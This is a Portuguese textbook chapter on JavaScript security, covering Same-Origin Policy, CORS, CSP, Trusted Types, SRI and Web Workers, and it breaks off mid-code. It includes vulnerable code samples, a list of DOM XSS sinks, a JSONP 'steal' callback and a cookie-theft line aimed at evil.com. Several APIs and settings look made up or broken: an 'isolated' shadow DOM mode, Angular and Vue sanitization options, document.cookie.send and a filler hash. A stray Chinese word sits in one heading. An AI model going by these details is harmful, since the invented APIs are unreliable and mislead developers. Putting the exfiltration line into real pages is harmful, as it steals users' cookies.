# Capitulo 12 -- JavaScript Seguro no Browser e Node.js

> *"JavaScript e a linguagem mais usada e mais atacada do mundo. Dominar sua seguranca e opcional -- ate nao ser."*

---

## 12.1 Objetivos de Aprendizado

Ao final deste capitulo, voce sera capaz de:

1. Explicar o modelo de Same-Origin Policy e suas implicacoes de seguranca em detalhes
2. Implementar Content Security Policy (CSP) completa em aplicacoes reais
3. Utilizar a Trusted Types API para prevenir DOM XSS
4. Configurar Subresource Integrity (SRI) para proteger carregamento de recursos externos
5. Entender o modelo de seguranca de Web Workers e Service Workers
6. Identificar e prevenir prototype pollution em JavaScript
7. Aplicar praticas de seguranca em Node.js, incluindo sandboxing e auditoria de dependencias
8. Configurar npm com integridade de lockfiles e proveniencia de pacotes
9. Comparar os modelos de seguranca de Deno e Bun com o Node.js
10. Aplicar padroes de codificacao segura em JavaScript no browser e no server-side

---

## 12.2 Same-Origin Policy -- Deep Dive

### 12.2.1 O Que e Same-Origin Policy

A Same-Origin Policy (SOP) e a pedra angular da seguranca no navegador. Ela determina que um recurso carregado de um origin so pode interagir com outro recurso se ambos compartilharem o mesmo origin. Sem a SOP, qualquer pagina da web poderia acessar dados de qualquer outra pagina, tornando a navegacao web fundamentalmente insegura.

Um origin e definido pela combinacao de tres componentes:

| Componente | Descricao | Exemplo |
|------------|-----------|---------|
| Protocolo (scheme) | HTTP, HTTPS, etc. | `https` |
| Hostname | Dominio ou IP | `example.com` |
| Porta | Numero da porta | `443` |

Dois recursos compartilham o mesmo origin quando todos os tres componentes sao identicos. Qualquer diferanca em um so componente cria origins distintos.

### 12.2.2 Exemplos de Origins

```
https://example.com:443/page.html
  |         |          |    |
  |         |          |    +-- path (nao importa para origin)
  |         |          +-- porta
  |         +-- hostname
  +-- protocolo

Comparacoes:

https://example.com:443/page.html    --> origin: https://example.com:443
https://example.com:8080/page.html   --> DIFERENTE (porta diferente)
https://www.example.com/page.html    --> DIFERENTE (hostname diferente)
http://example.com/page.html         --> DIFERENTE (protocolo diferente)
https://example.com:443/other.html   --> MESMO origin
https://sub.example.com/page.html    --> DIFERENTE (hostname diferente)
```

### 12.2.3 O Que a SOP Permite e Bloqueia

A Same-Origin Policy controla o acesso entre origins de formas especificas:

**Permitido no mesmo origin:**
- Leitura de DOM completa (innerHTML, textContent, etc.)
- Leitura de cookies, localStorage, sessionStorage
- Requisicoes AJAX/Fetch para o mesmo origin
- Acesso a variaveis JavaScript do iframe pai (mesmo origin)

**Bloqueado entre origins diferentes:**
- Leitura do DOM de um iframe de outro origin
- Leitura de cookies de outro origin
- Acesso a localStorage de outro origin
- Requisicoes XMLHttpRequest/Fetch cross-origin (sem CORS)
- Acesso a variaveis JavaScript de um iframe cross-origin

**Permitido entre origins diferentes (com restricoes):**
- Navegacao de iframe (pode carregar, nao pode ler DOM)
- Injecao de scripts em iframe cross-origin
- Submissao de formularios cross-origin
- Navegacao via window.open
- Comunicacao via postMessage (com validacao de origin)

### 12.2.4 Navegacao e嵌入 (Embedding)

O navegador permite que certos elementos carreguem recursos de outros origins, mesmo com a SOP ativa. Isso cria uma superficie de ataque significativa:

```html
<!-- Permitido: carregar imagem cross-origin -->
<img src="https://attacker.com/image.png">

<!-- Permitido: carregar script cross-origin -->
<script src="https://cdn.example.com/library.js"></script>

<!-- Permitido: carregar CSS cross-origin -->
<link rel="stylesheet" href="https://cdn.example.com/style.css">

<!-- Permitido: carregar iframe cross-origin -->
<iframe src="https://other-origin.com/page"></iframe>

<!-- Permitido: carregar video cross-origin -->
<video src="https://attacker.com/video.mp4"></video>
```

A differenca critica e que carregar um recurso e diferente de ler sua resposta. O navegador pode baixar o script, mas a SOP impede que o script malicioso leia o DOM da pagina que o carregou (exceto quando ha vulnerabilidades como XSS).

### 12.2.5 CORS -- Cross-Origin Resource Sharing

CORS e o mecanismo que o navegador usa para permitir que uma pagina faça requisicoes cross-origin de forma controlada. O protocolo funciona via headers HTTP:

**Requisicao preflight (OPTIONS):**

Quando o navegador precisa fazer uma requisicao complexa cross-origin (como PUT, DELETE, ou com headers customizados), ele envia primeiro uma requisicao OPTIONS chamada "preflight":

```
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://myapp.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

**Resposta do servidor:**

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**Headers CORS criticos para seguranca:**

| Header | Funcao | Risco se mal configurado |
|--------|--------|--------------------------|
| `Access-Control-Allow-Origin` | Define quem pode acessar | `*` permite qualquer site ler a resposta |
| `Access-Control-Allow-Credentials` | Permite cookies/auth | true + origin especifico e perigoso com `*` |
| `Access-Control-Allow-Methods` | Metodos permitidos | Restringir a metodos necessarios |
| `Access-Control-Allow-Headers` | Headers permitidos | Evitar aceitar qualquer header |
| `Access-Control-Expose-Headers` | Headers expostos ao JS | Nao expor headers sensiveis |
| `Access-Control-Max-Age` | Cache do preflight | Valor alto reduz seguranca |

### 12.2.6 Vulnerabilidades Relacionadas a SOP

**SOP Bypass via subdominios:**

```javascript
// Se example.com define cookie com Domain=.example.com
// e attacker controla subdominio.sub.example.com:
// O cookie e compartilhado, permitindo ataques

// Previna: use Domain restritivo
Set-Cookie: session=abc123; Domain=app.example.com; Secure; HttpOnly; SameSite=Strict
```

**SOP Bypass via postMessage:**

```javascript
// VULNERAVEL: Receber postMessage sem verificar origin
window.addEventListener('message', (event) => {
    // Qualquer site pode enviar esta mensagem
    const data = JSON.parse(event.data);
    processCommand(data);
});

// SEGURO: Sempre verificar o origin
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') {
        return;
    }
    const data = JSON.parse(event.data);
    processCommand(data);
});
```

**SOP Bypass via JSONP:**

```javascript
// VULNERAVEL: JSONP expoe dados cross-origin
// Endpoint que retorna:
// callback({"sensitive": "data"})

// Qualquer pagina pode carregar:
// <script src="https://api.example.com/data?callback=steal">
// function steal(data) { exfiltrate(data); }

// Previna: usar CORS ao inves de JSONP
```

**Mistyping attacks (typosquatting):**

```
https://examp1e.com     -- looks like example.com
https://example.com     -- legit
https://examplee.com    -- typo
https://exampIe.com     -- capital I vs lowercase l
```

Esses ataques exploram a similaridade visual entre dominios para enganar usuarios e contornar a SOP baseada em hostname.

### 12.2.7 Estrategias de Defesa para SOP

```javascript
// 1. Content-Security-Policy para restringir origens
// No servidor:
// Content-Security-Policy: default-src 'self'; script-src 'self' cdn.trusted.com

// 2. X-Frame-Options para prevenir clickjacking
// X-Frame-Options: DENY
// ou
// X-Frame-Options: SAMEORIGIN

// 3. Frame-Ancestors no CSP (mais moderno que X-Frame-Options)
// Content-Security-Policy: frame-ancestors 'self'

// 4. SameSite cookies para protecao CSRF
// Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly

// 5. Feature Policy / Permissions Policy
// Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### 12.2.8 Document.domain e SOP

Uma caracteristica perigosa e o `document.domain`, que permite que subdominios reduzam seu domain para compartilhar um parent domain:

```javascript
// Em https://app.example.com:
document.domain = 'example.com';

// Em https://api.example.com:
document.domain = 'example.com';

// Agora ambos podem acessar o DOM um do outro via iframe
// ISSO E PERIGOSO -- qualquer subdominio comprometido afeta todos

// Previna: nunca defina document.domain
// Use postMessage ao inves
```

A recomendacao moderna e nunca usar `document.domain`. Se voce precisa de comunicacao entre subdominios, use `postMessage` com validacao rigorosa de origin.

### 12.2.9 Portals e Isolated Apps

O navegador moderno oferece mecanismos para isolar aplicacoes:

```html
<!-- Portal: renderiza cross-origin como preview -->
<portal src="https://other-origin.com"></portal>

<!-- Isolated Shadow DOM: impede exportacao de IDs -->
<host-element>
  #shadow-root (isolated)
    <div id="my-element">Conteudo isolado</div>
</host-element>

<!-- Closed Shadow DOM: impossivel acessar via JS externo -->
<script>
    // hostElement.shadowRoot retorna null para closed mode
</script>
```

---

## 12.3 Content Security Policy (CSP) -- Guia Completo

### 12.3.1 Por Que CSP e Essencial

Content Security Policy e o mecanismo mais poderoso para mitigar XSS e outros ataques de injecao no navegador. CSP funciona definindo quais origens de conteudo o navegador pode carregar e executar.

Sem CSP, qualquer XSS permite executar JavaScript arbitrario. Com CSP bem configurado, mesmo que um atacante consiga injetar script, o navegador recusa executa-lo.

### 12.3.2 Diretrizes (Directives) do CSP

Cada diretriz controla uma categoria de recurso:

| Diretriz | Controle | Exemplo de uso |
|----------|----------|----------------|
| `default-src` | Fallback para todas as diretrizes | `'self'` |
| `script-src` | Scripts JavaScript | `'self'` |
| `style-src` | Folhas de estilo CSS | `'self'` |
| `img-src` | Imagens | `'self'` data: |
| `font-src` | Fontes | `'self'` fonts.gstatic.com |
| `connect-src` | Conexoes (fetch, XHR, WebSocket) | `'self'` |
| `media-src` | Audio e video | `'self'` |
| `object-src` | Plugins (Flash, Java) | `'none'` |
| `frame-src` | Iframes | `'self'` |
| `child-src` | Workers e iframes | `'self'` |
| `worker-src` | Web Workers e Service Workers | `'self'` |
| `manifest-src` | Manifestos de aplicacao | `'self'` |
| `form-action` | Destinos de formularios | `'self'` |
| `frame-ancestors` | Quem pode embutir | `'none'` |
| `base-uri` | URL base do documento | `'self'` |
| `upgrade-insecure-requests` | Converte HTTP para HTTPS | (diretiva) |
| `require-trusted-types-for` | Ativa Trusted Types | `'script'` |

### 12.3.3 Source Values (Valores de Origem)

Os valores que podem ser usados nas diretrizes:

| Valor | Descricao | Seguranca |
|-------|-----------|-----------|
| `'none'` | Nenhum recurso permitido | Maxima |
| `'self'` | Apenas mesmo origin | Alta |
| `'unsafe-inline'` | Permite inline scripts/styles | Perigoso |
| `'unsafe-eval'` | Permite eval() | Muito perigoso |
| `'wasm-unsafe-eval'` | Permite WebAssembly | Medio |
| `'strict-dynamic'` | Confia em scripts carregados por scripts confiaveis | Moderno |
| `'nonce-{valor}'` | Permite scripts com nonce especifico | Alto (recomendado) |
| `'hash-{algoritmo}-{hash}'` | Permite scripts com hash especifico | Alto |
| `https:` | Permite qualquer recurso via HTTPS | Variavel |
| `data:` | Permite data URIs | Perigoso para scripts |
| `blob:` | Permite blob URIs | Medio |
| `*.example.com` | Wildcard de subdominio | Variavel |
| `https://cdn.example.com` | Origem especifica | Alto |

### 12.3.4 Exemplos de CSP por Nivel de Seguranca

**Nivel 1 -- Basico (protecao minima):**

```
Content-Security-Policy: default-src 'self'
```

Isso permite qualquer coisa do mesmo origin, mas bloqueia scripts inline e de origens externas.

**Nivel 2 -- Intermediario:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' fonts.gstatic.com; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

**Nivel 3 -- Avancado (recomendado):**

```
Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; img-src 'self' data: https:; font-src 'self' fonts.gstatic.com; connect-src 'self' https://api.example.com; media-src 'self'; object-src 'none'; frame-src 'none'; child-src 'self'; worker-src 'self'; manifest-src 'self'; form-action 'self'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests; require-trusted-types-for 'script'
```

### 12.3.5 Nonces -- A Forma Recomendada de Proteger Scripts

Nonces sao valores aleatorios gerados por requisicao que permitem scripts especificos:

```html
<!-- No servidor, gere um nonce aleatorio para cada requisicao -->
<!-- Content-Security-Policy: script-src 'nonce-a1b2c3d4' -->

<!-- O script com o nonce correto e permitido -->
<script nonce="a1b2c3d4">
    // Este script e executado normalmente
    document.getElementById('app').textContent = 'Carregado';
</script>

<!-- Scripts sem nonce sao bloqueados -->
<script>
    // BLOCKED by CSP -- este script nao tem nonce
    alert('bloqueado');
</script>

<!-- Scripts inline sem nonce tambem sao bloqueados -->
<button onclick="alert('bloqueado')">Clique</button>
```

Para gerar nonces seguros no servidor:

```javascript
// Node.js com Express
import crypto from 'crypto';

function generateNonce() {
    return crypto.randomBytes(16).toString('base64');
}

app.use((req, res, next) => {
    const nonce = generateNonce();
    res.locals.cspNonce = nonce;

    res.setHeader('Content-Security-Policy', [
        `default-src 'none'`,
        `script-src 'nonce-${nonce}' 'strict-dynamic'`,
        `style-src 'self' 'nonce-${nonce}'`,
        `img-src 'self' data: https:`,
        `font-src 'self' fonts.gstatic.com`,
        `connect-src 'self' https://api.example.com`,
        `object-src 'none'`,
        `frame-ancestors 'none'`,
        `base-uri 'self'`,
        `form-action 'self'`,
        `upgrade-insecure-requests`
    ].join('; '));

    next();
});
```

### 12.3.6 Hashes -- Alternativa aos Nonces

Hashes permitem scripts especificos pelo seu conteudo, sem precisar de nonce:

```javascript
// Para calcular o hash SHA-256 de um script
const crypto = require('crypto');

function calculateScriptHash(scriptContent) {
    return crypto.createHash('sha256')
        .update(scriptContent)
        .digest('base64');
}

// Script inline:
// alert('Hello World');

// Hash calculado:
// sha256-B2yYJnK3yI0nH2nH2nH2nH2nH2nH2nH2nH2nH2nH=

// CSP:
// Content-Security-Policy: script-src 'sha256-B2yYJnK3yI0nH2nH2nH2nH2nH2nH2nH2nH2nH2nH='
```

**Limitacao dos hashes:** voce precisa atualizar o CSP toda vez que o script muda. Nonces sao mais flexiveis porque mudam a cada requisicao.

### 12.3.7 strict-dynamic

`'strict-dynamic'` e uma diretriz moderna que confia em scripts carregados por scripts ja confiaveis:

```javascript
// CSP: script-src 'nonce-abc123' 'strict-dynamic'

// Script confiavel (com nonce):
<script nonce="abc123">
    // Este script pode carregar outros scripts dinamicamente
    const script = document.createElement('script');
    script.src = 'https://cdn.example.com/library.js';
    // Este novo script TAMBEM e confiavel (herda confianca)
    document.head.appendChild(script);
</script>

// Script SEM nonce:
<script>
    // NAO pode carregar scripts dinamicamente
    // 'strict-dynamic' bloqueia scripts sem nonce
</script>
```

`'strict-dynamic'` ignora `'self'` e origens externas, simplificando o CSP. A confianca se propaga de scripts com nonce/hash para scripts carregados dinamicamente por eles.

### 12.3.8 CSP Reporting

O CSP permite receber relatorios de violacoes:

```
Content-Security-Policy: default-src 'self'; report-uri /csp-report; report-to csp-endpoint
```

**Formato do relatorio (Report API):**

```json
{
    "type": "csp-violation",
    "age": 10,
    "body": {
        "documentURL": "https://example.com/page",
        "referrer": "",
        "blockedURL": "https://evil.com/script.js",
        "effectiveDirective": "script-src",
        "originalPolicy": "default-src 'self'",
        "statusCode": 200,
        "sample": ""
    }
}
```

**Implementando o endpoint de relatorio:**

```javascript
// Node.js/Express
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
    const report = req.body;

    console.error('CSP Violation:', {
        blocked: report.body.blockedURL,
        directive: report.body.effectiveDirective,
        document: report.body.documentURL,
        policy: report.body.originalPolicy
    });

    // Armazenar para analise posterior
    storeViolation(report);

    res.status(204).end();
});
```

### 12.3.9 CSP em Single Page Applications (SPAs)

SPAs enfrentam desafios unicos com CSP porque frequentemente usam inline scripts e eval:

```javascript
// React/Vue/Angular -- CSP compativel

// 1. Compile inline scripts como arquivos separados
// VULNERAVEL:
<div dangerouslySetInnerHTML={{__html: '<script>alert("xss")</script>'}} />

// SEGURO: carregar script externo
<script src="/static/app.js" nonce={cspNonce}></script>

// 2. Desabilitar source maps em producao
// webpack.config.js:
module.exports = {
    devtool: process.env.NODE_ENV === 'production' ? false : 'source-map'
};

// 3. Usar CSP nonce em framework-specific
// Next.js (pages/_document.js):
import { Html, Head, Main, NextScript } from 'next/document';

function Document() {
    return (
        <Html>
            <Head>
                <meta
                    httpEquiv="Content-Security-Policy"
                    content={`script-src 'nonce-${process.env.CSP_NONCE}' 'strict-dynamic'`}
                />
            </Head>
            <body>
                <Main />
                <NextScript />
            </body>
        </Html>
    );
}

// 4. Webpack nonce plugin
// webpack.config.js:
const crypto = require('crypto');
const webpack = require('webpack');

class CSPNoncePlugin {
    apply(compiler) {
        compiler.hooks.compilation.tap('CSPNoncePlugin', (compilation) => {
            compilation.hooks.htmlWebpackPluginAlterAssetTags.tapAsync(
                'CSPNoncePlugin',
                (data, cb) => {
                    const nonce = crypto.randomBytes(16).toString('base64');
                    data.assetTags.scripts.forEach(script => {
                        script.attributes.nonce = nonce;
                    });
                    data.plugin.options.nonce = nonce;
                    cb(null, data);
                }
            );
        });
    }
}
```

### 12.3.10 Erros Comuns de CSP

| Erro | Consequencia | Correcao |
|------|-------------|----------|
| Usar `'unsafe-inline'` | Anula protecao contra XSS | Usar nonces ou hashes |
| Usar `'unsafe-eval'` | Permite eval(), Function() | Refatorar codigo |
| `default-src 'self'` sem outras diretrizes | Permite qualquer coisa do mesmo origin | Definir cada diretriz |
| `*.example.com` muito generoso | Qualquer subdominio serve conteudo | Usar dominio exato |
| `data:` em script-src | Permite scripts via data URI | Nao usar em script-src |
| Sem report-uri | Nao sabe se CSP esta funcionando | Sempre adicionar relatorio |
| CSP em apenas uma pagina | Inconsistente e facil de burlar | CSP global no servidor |

### 12.3.11 CSP no Server-Side Rendering (SSR)

```javascript
// Express com helmet para CSP
import helmet from 'helmet';

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`, "'strict-dynamic'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            fontSrc: ["'self'", "fonts.gstatic.com"],
            connectSrc: ["'self'", "https://api.example.com"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"],
            baseUri: ["'self'"],
            formAction: ["'self'"]
        },
        reportOnly: false
    }
}));
```

### 12.3.12 Testing CSP

```javascript
// Ferramenta de teste de CSP
// 1. Use report-only primeiro para testar sem quebrar
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'nonce-{nonce}'; report-uri /csp-report

// 2. Ferramenta online: https://csp-evaluator.withgoogle.com/
// 3. Ferramenta CLI: csp-analyzer

// Script de teste para CSP
const http = require('http');

function testCSP(url) {
    return new Promise((resolve, reject) => {
        http.get(url, (res) => {
            const csp = res.headers['content-security-policy'];
            const cspReportOnly = res.headers['content-security-policy-report-only'];

            resolve({
                url,
                csp: csp || null,
                reportOnly: cspReportOnly || null,
                hasCSP: !!(csp || cspReportOnly)
            });
        }).on('error', reject);
    });
}

// Testar multiplos sites
async function batchTest(urls) {
    const results = await Promise.all(urls.map(testCSP));
    results.forEach(r => {
        console.log(`${r.url}: ${r.hasCSP ? 'CSP OK' : 'SEM CSP'}`);
        if (r.csp) console.log(`  Policy: ${r.csp.substring(0, 100)}...`);
    });
}
```

---

## 12.4 Trusted Types API

### 12.4.1 O Problema do DOM XSS

DOM XSS ocorre quando dados de origem nao confiavel sao injetados em sinks perigosos do DOM. A Trusted Types API previne isso exigindo que todo conteudo que atinge sinks perigosos passe por uma politica de sanitizacao.

**Sinks perigosos (onde DOM XSS pode ocorrer):**

```javascript
// Todos estes sinks sao vetores de DOM XSS:

// 1. InnerHTML -- o mais comum
element.innerHTML = userInput;

// 2. OuterHTML
element.outerHTML = userInput;

// 3. document.write
document.write(userInput);

// 4. eval
eval(userInput);

// 5. setTimeout/setInterval com string
setTimeout('alert("' + userInput + '")', 1000);
setInterval('process("' + userInput + '")', 5000);

// 6. Function constructor
new Function('return "' + userInput + '"')();

// 7. Element.setAttribute com atributos perigosos
element.setAttribute('onclick', userInput);
element.setAttribute('src', userInput);
element.setAttribute('href', userInput);
element.setAttribute('formaction', userInput);
element.setAttribute('xlink:href', userInput);

// 8. Atributos inline
element.innerHTML = '<a href="' + userInput + '">link</a>';

// 9. Script.src
script.src = userInput;

// 10. Location changes
location = userInput;
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
```

### 12.4.2 Como Trusted Types Funciona

Trusted Types intercepta todos os sinks perigosos e so permite que `TrustedHTML`, `TrustedScript`, ou `TrustedScriptURL` sejam passados. Strings puras sao bloqueadas.

```javascript
// CSP para ativar Trusted Types
// Content-Security-Policy: require-trusted-types-for 'script'

// Sem Trusted Types -- bloqueado:
element.innerHTML = '<div>texto</div>';
// TypeError: This document requires a Trusted Types assignment

// Com Trusted Types -- usando policy:
const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true }),
    createScript: (input) => {
        if (containsUnsafeCode(input)) {
            throw new Error('Script content not allowed');
        }
        return input;
    },
    createScriptURL: (input) => {
        const url = new URL(input, document.baseURI);
        if (!ALLOWED_ORIGINS.includes(url.origin)) {
            throw new Error('Script URL not allowed');
        }
        return url.href;
    }
});

// Agora funciona com sanitizacao:
element.innerHTML = policy.createHTML('<div>texto</div>');
```

### 12.4.3 Criando Politicas

```javascript
// Politica para sanitizacao de HTML
const sanitizePolicy = trustedTypes.createPolicy('sanitize', {
    createHTML: (input) => {
        return DOMPurify.sanitize(input, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
            ALLOWED_ATTR: ['href', 'title'],
            ALLOW_DATA_ATTR: false
        });
    }
});

// Politica para URLs confiaveis
const urlPolicy = trustedTypes.createPolicy('url', {
    createScriptURL: (input) => {
        try {
            const url = new URL(input, document.baseURI);
            if (url.protocol === 'https:' || url.protocol === 'blob:') {
                return url.href;
            }
            throw new Error('Only HTTPS URLs allowed');
        } catch (e) {
            throw new Error(`Invalid URL: ${input}`);
        }
    }
});

// Politica para scripts
const scriptPolicy = trustedTypes.createPolicy('scripts', {
    createScript: (input) => {
        // Validar que o script nao contem codigo perigoso
        if (input.includes('eval(') || input.includes('Function(')) {
            throw new Error('Dynamic code execution not allowed');
        }
        return input;
    }
});

// Politica default (fallback)
const defaultPolicy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScript: (input) => input,
    createScriptURL: (input) => urlPolicy.createScriptURL(input)
});
```

### 12.4.4 Trusted Types em Frameworks

```javascript
// React -- usar dangerouslySetInnerHTML com Trusted Types
function UserContent({ html }) {
    const policy = trustedTypes.createPolicy('react', {
        createHTML: (input) => DOMPurify.sanitize(input)
    });

    return (
        <div
            dangerouslySetInnerHTML={{
                __html: policy.createHTML(html)
            }}
        />
    );
}

// Angular -- configurar Trusted Types
// angular.json:
// "trustedTypes": {
//     "enabled": true,
//     "policyConfig": {
//         "allowDuplicates": false
//     },
//     "namePolicies": {
//         "SCRIPT_URL": {
//             "somePolicyName": {
//                 "scriptURL": true
//             }
//         }
//     }
// }

// Vue -- template compilation segura
// vue.config.js:
module.exports = {
    chainWebpack: config => {
        config.module
            .rule('vue')
            .use('vue-loader')
            .tap(options => {
                options.compilerOptions = {
                    ...options.compilerOptions,
                    sanitize: true
                };
                return options;
            });
    }
};
```

### 12.4.5 Monitoramento e Auditoria de Trusted Types

```javascript
// Detectar violacoes de Trusted Types
if (window.trustedTypes && window.trustedTypes.createPolicy) {
    console.log('Trusted Types suportado');
}

// Verificar politicas ativas
const policies = window.trustedTypes.getPolicyNames();
console.log('Politicas ativas:', policies);

// Hook para auditar chamadas
const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
    set: function(value) {
        if (value && typeof value === 'string') {
            console.warn('String assignment to innerHTML detected. Use Trusted Types.');
        }
        return originalInnerHTML.set.call(this, value);
    },
    get: originalInnerHTML.get
});
```

---

## 12.5 Subresource Integrity (SRI)

### 12.5.1 O Problema de CDN Comprometido

Quando uma pagina carrega scripts ou estilos de CDN, ela confia que o conteudo nao foi alterado. Se o CDN for comprometido, scripts maliciosos podem ser injetados em todas as paginas que o carregam.

**Exemplo de ataque via CDN:**

```html
<!-- Pagina carrega jQuery de CDN -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

<!-- CDN comprometido -- script malicioso injetado -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<!-- O conteudo agora contem: -->
<!-- <script>document.cookie.send('https://evil.com/steal')</script> -->
```

### 12.5.2 Como SRI Funciona

SRI usa hashes criptograficos para garantir que o conteudo carregado corresponde ao esperado:

```html
<!-- SRI com SHA-384 -->
<script src="https://cdn.example.com/library.js"
        integrity="sha384-base64hashAqui"
        crossorigin="anonymous"></script>

<!-- SRI com SHA-256 -->
<link rel="stylesheet"
      href="https://cdn.example.com/style.css"
      integrity="sha256-base64hashAqui"
      crossorigin="anonymous">

<!-- Multiplos hashes (para compatibilidade) -->
<script src="https://cdn.example.com/library.js"
        integrity="sha256-hash1 sha384-hash2"
        crossorigin="anonymous"></script>
```

### 12.5.3 Gerando Hashes SRI

```javascript
// Usando openssl no terminal
// openssl dgst -sha384 -binary library.js | openssl base64 -A

// Usando Node.js para gerar hashes
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filePath, algorithm = 'sha384') {
    const content = fs.readFileSync(filePath);
    const hash = crypto.createHash(algorithm)
        .update(content)
        .digest('base64');
    return `${algorithm}-${hash}`;
}

// Gerar SRI para multiplos arquivos
function generateSRIMap(manifest) {
    const sriMap = {};
    for (const [name, path] of Object.entries(manifest)) {
        sriMap[name] = {
            path,
            sri: generateSRI(path),
            sha256: generateSRI(path, 'sha256'),
            sha512: generateSRI(path, 'sha512')
        };
    }
    return sriMap;
}

// Exemplo de uso
const manifest = {
    jquery: '/static/js/jquery.min.js',
    bootstrap: '/static/css/bootstrap.min.css',
    app: '/static/js/app.min.js'
};

const sriMap = generateSRIMap(manifest);
console.log(sriMap);

// Output:
// {
//   jquery: { path: '/static/js/jquery.min.js', sri: 'sha384-abc123...', ... },
//   bootstrap: { path: '/static/css/bootstrap.min.css', sri: 'sha384-def456...', ... },
//   app: { path: '/static/js/app.min.js', sri: 'sha384-ghi789...', ... }
// }
```

### 12.5.4 SRI em Build Systems

```javascript
// Webpack plugin para SRI automatico
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');

class SRIChecksumPlugin {
    apply(compiler) {
        compiler.hooks.compilation.tap('SRIChecksumPlugin', (compilation) => {
            compilation.hooks.htmlWebpackPluginAlterAssetTags.tapAsync(
                'SRIChecksumPlugin',
                (data, cb) => {
                    const publicPath = compiler.options.output.publicPath || '';

                    data.assetTags.scripts.forEach(script => {
                        if (script.attributes.src) {
                            const filePath = path.join(
                                compiler.options.output.path,
                                script.attributes.src.replace(publicPath, '')
                            );

                            if (fs.existsSync(filePath)) {
                                const content = fs.readFileSync(filePath);
                                const hash = crypto.createHash('sha384')
                                    .update(content)
                                    .digest('base64');
                                script.attributes.integrity = `sha384-${hash}`;
                                script.attributes.crossorigin = 'anonymous';
                            }
                        }
                    });

                    data.assetTags.styles.forEach(style => {
                        if (style.attributes.href) {
                            const filePath = path.join(
                                compiler.options.output.path,
                                style.attributes.href.replace(publicPath, '')
                            );

                            if (fs.existsSync(filePath)) {
                                const content = fs.readFileSync(filePath);
                                const hash = crypto.createHash('sha384')
                                    .update(content)
                                    .digest('base64');
                                style.attributes.integrity = `sha384-${hash}`;
                                style.attributes.crossorigin = 'anonymous';
                            }
                        }
                    });

                    cb(null, data);
                }
            );
        });
    }
}

module.exports = SRIChecksumPlugin;
```

### 12.5.5 SRI em Ambientes Dinamicos

```javascript
// Gerar SRI dinamicamente no servidor
import crypto from 'crypto';
import fs from 'fs/promises';

class SRIManager {
    constructor(manifestPath) {
        this.cache = new Map();
        this.manifestPath = manifestPath;
    }

    async loadManifest() {
        const content = await fs.readFile(this.manifestPath, 'utf8');
        this.manifest = JSON.parse(content);
    }

    async getSRI(assetPath) {
        if (this.cache.has(assetPath)) {
            return this.cache.get(assetPath);
        }

        const filePath = path.join(__dirname, 'public', assetPath);
        const content = await fs.readFile(filePath);
        const hash = crypto.createHash('sha384')
            .update(content)
            .digest('base64');
        const sri = `sha384-${hash}`;

        this.cache.set(assetPath, sri);
        return sri;
    }

    async renderScriptTag(src) {
        const sri = await this.getSRI(src);
        return `<script src="${src}" integrity="${sri}" crossorigin="anonymous"></script>`;
    }

    async renderLinkTag(href) {
        const sri = await this.getSRI(href);
        return `<link rel="stylesheet" href="${href}" integrity="${sri}" crossorigin="anonymous">`;
    }
}

// Express middleware
app.use(async (req, res, next) => {
    res.locals.sri = new SRIManager('./asset-manifest.json');
    await res.locals.sri.loadManifest();
    next();
});
```

### 12.5.6 Limitacoes e Consideracoes do SRI

| Limitacao | Descricao | Mitigacao |
|-----------|-----------|-----------|
| Atualizacao de CDN | Hash quebra quando CDN atualiza | Usar SRI com multiplos hashes |
| Assets dinamicos | Nao funciona com conteudo que muda | Nao usar SRI em assets dinamicos |
| Crossorigin obrigatorio | Necessario crossorigin="anonymous" | Sempre incluir crossorigin |
| Compatibilidade browsers | IE11 nao suporta | Fallback sem SRI |
| Performance | Re-hash em cada build | Usar cache de build |

---

## 12.6 Web Workers -- Modelo de Seguranca

### 12.6.1 Arquitetura de Web Workers

Web Workers permitem executar JavaScript em threads separadas, isoladas do thread principal. Cada Worker tem seu proprio contexto de execucao:

```
Main Thread                    Worker Thread
    |                              |
    |--- postMessage(data) ------->|
    |                              | (executa computacao)
    |<-- postMessage(result) ------|
    |                              |
    |--- terminate() ------------->| (encerra worker)
```

### 12.6.2 Isolamento de Memoria

Cada Worker tem seu proprio heap de memoria. Workers nao podem acessar:

- Variaveis globais do thread principal
- DOM do thread principal
- Documento HTML
- Window object

```javascript
// main.js
const worker = new Worker('worker.js');

// Enviar dados para o Worker (copia, nao referencia)
worker.postMessage({
    type: 'process',
    data: largeArray // array e copiado, nao compartilhado
});

// Receber resultado do Worker
worker.onmessage = (event) => {
    const result = event.data;
